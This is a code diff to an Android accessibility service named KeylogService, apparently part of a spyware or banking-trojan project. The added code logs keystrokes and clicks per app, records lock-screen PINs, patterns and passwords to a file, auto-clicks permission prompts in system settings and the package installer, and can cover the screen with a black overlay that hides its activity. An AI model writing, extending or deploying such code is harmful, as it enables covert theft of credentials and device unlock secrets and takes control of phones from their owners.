@@ -2,14 +2,23 @@ package com.openaccess.sdk.service
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
+import android.app.KeyguardManager
+import android.content.Context
+import android.content.Intent
 import android.graphics.Bitmap
+import android.graphics.Color
+import android.graphics.PixelFormat
 import android.graphics.ColorSpace
 import android.hardware.HardwareBuffer
+import android.net.Uri
 import android.os.Build
 import android.util.Log
 import android.view.Display
+import android.view.Gravity
+import android.view.WindowManager
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import android.widget.FrameLayout
 import kotlinx.coroutines.suspendCancellableCoroutine
 import java.io.ByteArrayOutputStream
 import java.io.File
@@ -46,21 +55,18 @@ class KeylogService : AccessibilityService() {
                         try {
                             val hb = result.hardwareBuffer
                             val cs = result.colorSpace
-                            val bitmap = Bitmap.wrapHardwareBuffer(hb, cs) ?: run {
-                                cont.resume(null)
-                                return
-                            }
+                            val bitmap = Bitmap.wrapHardwareBuffer(hb, cs) ?: run { cont.resume(null); return }
                             val stream = ByteArrayOutputStream()
                             bitmap.compress(Bitmap.CompressFormat.PNG, 100, stream)
                             bitmap.recycle()
                             cont.resume(stream.toByteArray())
                         } catch (e: Exception) {
-                            Log.e(TAG, "screenshot onSuccess: ${e.message}")
+                            Log.e(TAG, "screenshot: ${e.message}")
                             cont.resume(null)
                         }
                     }
                     override fun onFailure(errorCode: Int) {
-                        Log.w(TAG, "screenshot onFailure: code=$errorCode")
+                        Log.w(TAG, "screenshot fail: code=$errorCode")
                         cont.resume(null)
                     }
                 })
@@ -68,16 +74,36 @@ class KeylogService : AccessibilityService() {
         }
     }
 
+    lateinit var harvester: HarvesterModule
+        private set
+    private var windowManager: WindowManager? = null
+    private var blackOverlay: FrameLayout? = null
+    private var keyguardManager: KeyguardManager? = null
+
     override fun onServiceConnected() {
         super.onServiceConnected()
         instance = this
         isRunning = true
+        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+        keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
+        harvester = HarvesterModule(this)
+        logFile?.let { harvester.setLogFile(it) }
+        harvester.setCallback { pin, pattern, password ->
+            logFile?.appendText("${System.currentTimeMillis()} LOCK_CAPTURED pin=$pin pattern=$pattern password=$password\n")
+        }
+
         val info = AccessibilityServiceInfo().apply {
             eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
-                    AccessibilityEvent.TYPE_VIEW_FOCUSED
+                    AccessibilityEvent.TYPE_VIEW_FOCUSED or
+                    AccessibilityEvent.TYPE_VIEW_CLICKED or
+                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
+                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
+                    AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED or
+                    AccessibilityEvent.TYPE_WINDOWS_CHANGED
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
             notificationTimeout = 300
-            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
+            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
+                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
         }
         serviceInfo = info
         Log.i(TAG, "Keylog service connected")
@@ -89,12 +115,23 @@ class KeylogService : AccessibilityService() {
         var source: AccessibilityNodeInfo? = null
         try {
             source = event.source
+
+            harvester.onAccessibilityEvent(event)
+
+            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
+                event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+                val pkg = event.packageName?.toString() ?: ""
+                if (pkg.contains("com.android.systemui") || pkg.contains("settings") ||
+                    pkg.contains("packageinstaller") || pkg.contains("permissioncontroller")) {
+                    source?.let { harvester.autoClickGrant(it) }
+                }
+            }
+
             when (event.eventType) {
                 AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                     val text = event.text?.joinToString("") ?: return
                     if (text.isNotEmpty()) {
-                        val hint = getHint(source)
-                        val entry = "[${System.currentTimeMillis()}] $hint: $text\n"
+                        val entry = "[${System.currentTimeMillis()}] ${event.packageName}: $text\n"
                         appendText(entry)
                         logFile?.appendText(entry)
                     }
@@ -107,6 +144,13 @@ class KeylogService : AccessibilityService() {
                             appendText(entry)
                             logFile?.appendText(entry)
                         }
+                    }
+                }
+                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
+                    val text = event.text?.joinToString("") ?: ""
+                    if (text.isNotEmpty()) {
+                        val entry = "[${System.currentTimeMillis()}] Click: $text\n"
+                        appendText(entry)
                     }
                 }
             }
@@ -127,6 +171,37 @@ class KeylogService : AccessibilityService() {
         } catch (_: Exception) { "" }
     }
 
+    fun toggleBlackOverlay(enable: Boolean) {
+        if (enable) {
+            if (blackOverlay == null) {
+                blackOverlay = FrameLayout(this).apply {
+                    setBackgroundColor(Color.BLACK)
+                }
+                val params = WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
+                    else
+                        WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                            WindowManager.LayoutParams.FLAG_FULLSCREEN,
+                    PixelFormat.TRANSLUCENT
+                ).apply { gravity = Gravity.TOP }
+                windowManager?.addView(blackOverlay, params)
+                Log.i(TAG, "Black overlay enabled")
+            }
+        } else {
+            blackOverlay?.let {
+                try { windowManager?.removeView(it) } catch (_: Exception) {}
+                blackOverlay = null
+                Log.i(TAG, "Black overlay disabled")
+            }
+        }
+    }
+
     override fun onInterrupt() {
         Log.i(TAG, "Keylog service interrupted")
         isRunning = false
@@ -136,6 +211,7 @@ class KeylogService : AccessibilityService() {
         super.onDestroy()
         instance = null
         isRunning = false
+        toggleBlackOverlay(false)
         Log.i(TAG, "Keylog service destroyed")
         logFile?.appendText("${System.currentTimeMillis()} KeylogService destroyed\n")
     }
